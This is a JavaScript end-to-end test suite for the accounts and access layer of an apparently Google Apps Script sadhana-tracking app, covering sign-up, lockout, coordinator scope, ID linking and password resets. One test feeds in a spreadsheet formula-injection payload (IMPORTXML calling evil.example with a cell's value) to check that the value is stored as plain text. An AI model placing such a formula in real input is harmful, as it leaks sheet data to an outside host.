// Phase 1 end to end through doPost: sign-up, login, lockout, forced password change, coordinators,
// batch scope, approval with IYF ID rules, resets, sessions, replays. Google is mocked (tests/gas.mjs).
import crypto from 'node:crypto';
import { boot, suite } from './gas.mjs';

const t = suite('phase 1: accounts and access');
const REG = [
  { id: 'KT26-0042', name: 'Rahul Sharma', phone: '6000000310', level: 'SPS', facilitator: 'Vilasa Padmanabha Prabhuji', alias: ['6000000310|rl', 'KT26-0042'] },
  { id: 'GP26-0007', name: 'Amit Verma Pr', phone: '6000000311', level: 'SPS' },
  { id: 'GP26-0008', name: 'Old Duplicate', phone: '6000000322', level: 'DPS', status: 'Merged into GP26-0007' },
  { id: 'JN26-0100', name: 'Rahul Sharma', phone: '6000000300', level: 'DPS' }
];
const env = boot({ registryRows: REG });
const { call, g, tab, props, clock } = env;

// ---- crypto: our PBKDF2 equals Node's, peppered as the server does it
{
  const pep = 'p'.repeat(64), pw = 'Correct horse 9', salt = crypto.randomBytes(16);
  const key = crypto.createHmac('sha256', pep).update(pw).digest();
  const want = crypto.pbkdf2Sync(key, salt, 1500, 32, 'sha256').toString('base64');
  const got = g.Utilities.base64Encode(g.pbkdf2_(g.pepperedBytes_(pw), Array.from(salt, b => (b > 127 ? b - 256 : b)), 1500));
  t.eq(got, want, 'PBKDF2-HMAC-SHA-256 matches Node crypto');
}

// ---- envelope rules
t.code(call('meta.get', {}, undefined, { override: { v: 0 } }), 'UPGRADE_REQUIRED', 'old app version');
t.code(call('nope.nothing'), 'BAD_REQUEST', 'unknown action');
t.code(call('meta.get', { extra: 1 }), 'BAD_REQUEST', 'unknown field');
const meta = call('meta.get');
t.eq(meta.data.batches.map(b => b.batchId), ['SPS', 'SPS2', 'SPSO', 'DPS', 'BSS', 'BVS'], 'meta lists the 6 active batches');
t.eq(meta.data.submitWindow, { opens: 'SUN 18:00', closes: 'MON 21:00' }, 'submit window from Rules › Settings');

// ---- master
t.ok(!!(() => { try { g.createMaster(); } catch (e) { return e; } })(), 'createMaster refuses without MASTER_SETUP_PASSWORD');
props.set('MASTER_SETUP_PASSWORD', 'TempMaster#2026');
g.createMaster();
t.ok(!props.has('MASTER_SETUP_PASSWORD'), 'temporary master password removed from properties');
let r = call('auth.login', { login: 'master', password: 'TempMaster#2026', device: 'test' });
t.ok(r.ok && r.data.user.mustChangePassword === true && r.data.user.role === 'MASTER', 'master logs in, must change password');
let M = r.data.token;
t.code(call('coordinators.list', {}, M), 'MUST_CHANGE_PASSWORD', 'everything else blocked until the password is changed');
t.code(call('auth.me', {}, M), 'ok', 'auth.me allowed while forced change pending');
t.code(call('auth.changePassword', { current: 'wrong', new: 'Gauranga Nitai 2026' }, M), 'BAD_CREDENTIALS', 'wrong current password');
t.code(call('auth.changePassword', { current: 'TempMaster#2026', new: 'harekrishna' }, M), 'VALIDATION', 'common password refused');
t.code(call('auth.changePassword', { current: 'TempMaster#2026', new: 'Gauranga Nitai 2026' }, M), 'ok', 'master sets own password');
t.code(call('coordinators.list', {}, M), 'ok', 'master unblocked');

// ---- coordinator
t.code(call('coordinators.create', { username: 'sps', name: 'SPS Coordinators', batchIds: ['SPS', 'SPS2', 'SPSO'], tempPassword: 'short' }, M), 'VALIDATION', 'weak temp password');
t.code(call('coordinators.create', { username: 'sps', name: 'SPS Coordinators', batchIds: ['SPS', 'NOPE'], tempPassword: 'Temp-sps-2026' }, M), 'VALIDATION', 'unknown batch');
r = call('coordinators.create', { username: 'sps', name: 'SPS Coordinators', batchIds: ['SPS', 'SPS2', 'SPSO'], tempPassword: 'Temp-sps-2026' }, M);
t.eq([r.data.coordinator.username, r.data.coordinator.batchIds, r.data.coordinator.mustChangePassword], ['sps', ['SPS', 'SPS2', 'SPSO'], true], 'create returns the new row, so the app needs no reload');
t.eq(call('coordinators.update', { username: 'sps', name: 'SPS Coordinators Team' }, M).data.coordinator.name, 'SPS Coordinators Team', 'update returns the changed row');
t.code(call('coordinators.create', { username: 'sps', name: 'Again', batchIds: [], tempPassword: 'Temp-sps-2026' }, M), 'CONFLICT', 'username unique');
t.eq(call('batches.list', {}, M).data.filter(b => b.coordinatorLogins.includes('sps')).map(b => b.batchId), ['SPS', 'SPS2', 'SPSO'], 'batches carry the coordinator');
r = call('auth.login', { login: 'SPS', password: 'Temp-sps-2026' });
let C = r.data.token;
t.eq(r.data.user.batchIds, ['SPS', 'SPS2', 'SPSO'], 'coordinator login reports their batches');
t.code(call('auth.changePassword', { current: 'Temp-sps-2026', new: 'Sps coordinators 108!' }, C), 'ok', 'coordinator changes password');
t.code(call('coordinators.list', {}, C), 'FORBIDDEN', 'coordinator cannot manage coordinators');

// ---- sign-up
const signUp = (over = {}) => call('auth.signUp', { phone: '+91 98765 43210', name: 'Rahul  Sharma', batchId: 'SPS2', password: 'My sadhana 2026',
  profile: { dob: '2002-04-14', bloodGroup: 'B+', emergency: { name: 'Suresh Sharma', relation: 'Father', phone: '6000000289' } }, ...over });
r = signUp({ phone: '12345', password: 'abc' });
t.code(r, 'VALIDATION', 'bad sign-up refused');
t.eq(r.error.fields.map(f => f.path), ['phone', 'password'], 'each bad field named');
t.code(signUp({ password: '6000000310xyz' }), 'VALIDATION', 'password containing the phone refused');
t.code(signUp({ profile: { dob: '2002-04-14', bloodGroup: 'B+', emergency: { name: 'Me', relation: 'Self', phone: '6000000310' } } }), 'VALIDATION', 'own number as emergency contact refused');
t.code(signUp({ profile: { dob: '2002-04-14', bloodGroup: 'B+', aadhaar: '1234' } }), 'BAD_REQUEST', 'no extra profile fields (no ID numbers)');
const rid = 'fixed-request-id-1';
r = call('auth.signUp', { phone: '6000000310', name: 'Rahul Sharma', batchId: 'SPS2', password: 'My sadhana 2026',
  profile: { dob: '2002-04-14', bloodGroup: 'B+', emergency: { name: 'Suresh Sharma', relation: 'Father', phone: '6000000289' } } }, undefined, { requestId: rid });
t.eq(r.data, { status: 'PENDING' }, 'sign-up accepted as PENDING');
const again = call('auth.signUp', { phone: '6000000310', name: 'Rahul Sharma', batchId: 'SPS2', password: 'My sadhana 2026',
  profile: { dob: '2002-04-14', bloodGroup: 'B+', emergency: { name: 'Suresh Sharma', relation: 'Father', phone: '6000000289' } } }, undefined, { requestId: rid });
t.eq(again.data, { status: 'PENDING' }, 'same requestId replays the first answer');
t.eq(tab('access', 'Accounts').objects().filter(a => a.login === '6000000310').length, 1, 'replay wrote nothing twice');
t.code(signUp(), 'CONFLICT', 'second sign-up for the same phone refused');
const acctRow = tab('access', 'Accounts').objects().find(a => a.login === '6000000310');
t.ok(acctRow.pw_hash && !JSON.stringify(acctRow).includes('My sadhana 2026'), 'only a hash is stored');
t.eq(typeof acctRow.login, 'string', 'phone stored as text');
t.code(call('auth.login', { login: '09876543210', password: 'My sadhana 2026' }), 'PENDING_APPROVAL', 'pending told only after the right password');
t.code(call('auth.login', { login: '6000000310', password: 'wrong one' }), 'BAD_CREDENTIALS', 'wrong password');
t.code(call('auth.login', { login: '6000000400', password: 'whatever 1' }), 'BAD_CREDENTIALS', 'unknown number looks the same');
t.code(signUp({ phone: '6000000212', batchId: 'DPS', name: 'Dps Person' }), 'ok', 'a DPS sign-up');

// ---- coordinator sees own batches only, with registry matches
r = call('requests.list', {}, C);
t.eq(r.data.signUps.map(s => s.phone), ['6000000310'], 'SPS coordinator sees only SPS-batch sign-ups');
t.eq(r.data.signUps[0].matches.map(m => [m.iyfId, m.why]), [['KT26-0042', 'phone + name'], ['JN26-0100', 'name']], 'registry matches: alias first, then same name');
t.code(call('requests.list', { batchId: 'DPS' }, C), 'FORBIDDEN', 'cannot ask for another batch');
t.code(call('requests.approve', { phone: '6000000212', link: { noIdYet: true } }, C), 'FORBIDDEN', 'cannot approve another batch');
t.eq(call('registry.search', { q: 'rahul' }, C).data.results.map(x => x.iyfId), ['KT26-0042', 'JN26-0100'], 'registry search by name');

// ---- only allocated IDs
t.code(call('requests.approve', { phone: '6000000310', link: { iyfId: 'KT26-9999' } }, C), 'UNKNOWN_ID', 'made-up ID in the right format refused');
t.code(call('requests.approve', { phone: '6000000310', link: { iyfId: 'hello' } }, C), 'UNKNOWN_ID', 'not an ID');
r = call('requests.approve', { phone: '6000000310', link: { iyfId: 'GP26-0008' } }, C);
t.ok(r.error && r.error.code === 'UNKNOWN_ID' && r.error.message.includes('GP26-0007'), 'merged ID refused, names the ID it went into');
t.code(call('requests.approve', { phone: '6000000310', link: {} }, C), 'VALIDATION', 'must choose an ID or no-ID-yet');
r = call('requests.approve', { phone: '6000000310', link: { iyfId: 'kt26-0042' }, levelEntryDate: '2026-09-01' }, C);
t.eq(r.data, { iyfId: 'KT26-0042', linked: true }, 'approved and linked');
t.code(call('requests.approve', { phone: '6000000310', link: { noIdYet: true } }, C), 'CONFLICT', 'cannot decide twice');
const mem = tab('access', 'Memberships').objects();
t.eq(mem.map(m => [m.login, m.iyf_id, m.batch_id, m.state]), [['6000000310', 'KT26-0042', 'SPS2', 'ACTIVE']], 'membership opened');
t.eq(g.ymd_(mem[0].from_week), '2026-10-05', 'membership starts this Monday');
t.eq(tab('profiles', 'Profiles').objects().find(p => p.login === '6000000310').iyf_id, 'KT26-0042', 'profile linked');

// one account per ID
t.code(signUp({ phone: '6000000500', name: 'Rahul Sharma' }), 'ok', 'another sign-up');
t.code(call('requests.approve', { phone: '6000000500', link: { iyfId: 'KT26-0042' } }, C), 'CONFLICT', 'an ID already linked cannot be linked again');
t.eq(call('requests.list', {}, C).data.signUps[0].matches.find(m => m.iyfId === 'KT26-0042').linked, true, 'matches show which IDs are taken');
t.eq(call('requests.approve', { phone: '6000000500', link: { noIdYet: true } }, C).data, { iyfId: null, linked: false }, 'approve with no ID yet');

// ---- devotee
r = call('auth.login', { login: '6000000310', password: 'My sadhana 2026', device: 'Android' });
const D = r.data.token;
t.eq([r.data.user.role, r.data.user.iyfId, r.data.user.batchIds], ['DEVOTEE', 'KT26-0042', ['SPS2']], 'devotee logs in with ID and batch');
t.code(call('requests.list', {}, D), 'FORBIDDEN', 'devotee cannot see requests');
t.code(call('auth.me', {}, 'f'.repeat(64)), 'UNAUTHENTICATED', 'unknown token');
t.code(call('auth.me', {}, 'not-a-token'), 'UNAUTHENTICATED', 'malformed token');
t.eq(call('auth.me', {}, D).data.user.login, '6000000310', 'auth.me');

// ---- lockout
for (let i = 0; i < 4; i++) call('auth.login', { login: '6000000500', password: 'nope nope' });
r = call('auth.login', { login: '6000000500', password: 'nope nope' });
t.ok(r.error && r.error.code === 'LOCKED_OUT' && r.data.until, '5th wrong try locks the account');
t.code(call('auth.login', { login: '6000000500', password: 'My sadhana 2026' }), 'LOCKED_OUT', 'even the right password waits');
clock.now += 16 * 60000;
t.code(call('auth.login', { login: '6000000500', password: 'My sadhana 2026' }), 'ok', 'opens after 15 minutes');

// ---- reset: neutral reply, coordinator approval, sessions end
t.eq(call('auth.requestReset', { login: '6000000301', newPassword: 'Brand new pass 1' }).data, { status: 'RESET_REQUESTED' }, 'unknown number: same reply');
t.code(call('auth.requestReset', { login: '6000000310', newPassword: 'abc' }), 'VALIDATION', 'weak new password');
t.code(call('auth.requestReset', { login: '6000000310', newPassword: 'Brand new pass 1' }), 'ok', 'reset requested');
t.code(call('auth.login', { login: '6000000310', password: 'Brand new pass 1' }), 'BAD_CREDENTIALS', 'new password not active before approval');
t.code(call('auth.login', { login: '6000000310', password: 'My sadhana 2026' }), 'ok', 'old password still works meanwhile');
t.eq(call('requests.list', {}, C).data.resets.map(x => [x.login, x.role]), [['6000000310', 'DEVOTEE']], 'coordinator sees the reset');
r = call('requests.list', {}, M);
t.ok(r.data.resets.some(x => x.login === '6000000310'), 'master sees it too');
t.code(call('resets.approve', { login: '6000000310' }, C), 'ok', 'coordinator approves');
t.code(call('auth.me', {}, D), 'UNAUTHENTICATED', 'old sessions ended by the reset');
t.code(call('auth.login', { login: '6000000310', password: 'Brand new pass 1' }), 'ok', 'new password works');
t.code(call('auth.login', { login: '6000000310', password: 'My sadhana 2026' }), 'BAD_CREDENTIALS', 'old one does not');
t.code(call('resets.approve', { login: '6000000310' }, C), 'NOT_FOUND', 'nothing left to approve');

// coordinator resets go to the master only
t.code(call('auth.requestReset', { login: 'sps', newPassword: 'Coordinator new 1' }), 'ok', 'coordinator asks for a reset');
t.eq(call('requests.list', {}, C).data.resets.length, 0, 'coordinator does not see their own reset');
t.code(call('resets.approve', { login: 'sps' }, C), 'FORBIDDEN', 'and cannot approve it');
t.code(call('resets.approve', { login: 'sps' }, M), 'ok', 'master approves it');

// ---- access follows the batch at once
r = call('auth.login', { login: 'sps', password: 'Coordinator new 1' });
C = r.data.token;
t.code(call('requests.list', { batchId: 'SPS2' }, C), 'ok', 'coordinator has SPS2');
t.code(call('batches.update', { batchId: 'SPS2', coordinatorLogins: [] }, M), 'ok', 'master moves SPS2 away');
t.code(call('requests.list', { batchId: 'SPS2' }, C), 'FORBIDDEN', 'access to SPS2 ends at once');
t.code(call('coordinators.setDisabled', { username: 'sps', disabled: true }, M), 'ok', 'master disables the coordinator');
t.code(call('auth.me', {}, C), 'UNAUTHENTICATED', 'disabled coordinator signed out');
t.code(call('auth.login', { login: 'sps', password: 'Coordinator new 1' }), 'ACCOUNT_DISABLED', 'and cannot log in');

// ---- master ID tools
t.eq(call('ids.search', { q: 'KT26' }, M).data.results[0].linkedAccount, { login: '6000000310', name: 'Rahul Sharma' }, 'ID search shows the linked account');
t.code(call('ids.link', { login: '6000000500', iyfId: 'KT26-0042', reason: 'test' }, M), 'CONFLICT', 'master cannot double-link either');
t.code(call('ids.link', { login: '6000000500', iyfId: 'JN26-0100', reason: 'found on the register' }, M), 'ok', 'master links an existing ID');
t.code(call('ids.unlink', { login: '6000000500', reason: 'wrong person' }, M), 'ok', 'master unlinks');
t.ok(tab('access', 'AuditLog').objects().some(a => a.action === 'ids.unlink' && a.reason === 'wrong person'), 'ID changes are audited');

// ---- typed text can never become a formula in the sheet
call('auth.login', { login: '6000000310', password: 'Brand new pass 1', device: '=IMPORTXML("https://evil.example/?"&A1,"//a")' });
const sess = tab('access', 'Sessions'), devCol = sess.rows[0].indexOf('device') + 1;
const devRow = sess.rows.findIndex(r => String(r[devCol - 1]).includes('IMPORTXML')) + 1;
t.ok(devRow > 1 && sess.rows[devRow - 1][devCol - 1].startsWith('=IMPORTXML') && sess.textCells.has(devRow + ',' + devCol), 'formula-like text written as plain text, never as a formula');

// ---- server busy: a clear BUSY, never a half write
const busy = boot({ registryRows: REG, lockBusy: true });
r = busy.call('auth.signUp', { phone: '6000000600', name: 'Busy Person', batchId: 'DPS', password: 'Busy server 2026',
  profile: { dob: '2000-01-01', bloodGroup: 'O+', emergency: { name: 'Some One', relation: 'Friend', phone: '6000000800' } } });
t.code(r, 'BUSY', 'lock timeout → BUSY');
t.eq(busy.tab('access', 'Accounts').objects().length, 0, 'nothing written when busy');

t.done();
